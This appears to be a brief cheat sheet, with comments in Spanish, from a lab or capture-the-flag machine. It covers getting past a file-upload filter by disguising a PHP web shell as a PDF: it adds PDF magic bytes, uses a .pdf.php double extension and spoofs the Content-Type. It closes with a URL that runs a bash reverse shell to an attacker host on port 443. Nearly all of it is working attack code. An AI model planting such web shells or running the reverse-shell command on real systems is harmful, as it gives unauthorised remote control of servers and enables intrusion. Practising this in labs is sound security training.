

### BYPASS
```shell
#SI DA PROBLEMAS CAMBIAR EL CONTENT-TYPE DE LA SOLICITUD A PDF
nvim revershell.pdf.php

%PDF-1.5
<?php
	echo fread(popen($_GET['cmd'], "r"), 10000); 
?>
```


### REVERSE SHELL
```php
#A LA HORA DE SUBURLO AGREGAMOS: %PDF-1.5 Y EL CONTENT-TYPE EN PDF

%PDF-1.5
<?php echo fread(popen($_GET['cmd'], "r"), 10000);?>

# CARGAR ESTA URL:
http://10.10.11.173/logs/uploads/popen.pdf.php?cmd=bash%20-c%20%22bash%20-i%20%3E%26%20/dev/tcp/10.10.16.6/443%200%3E%261%22
```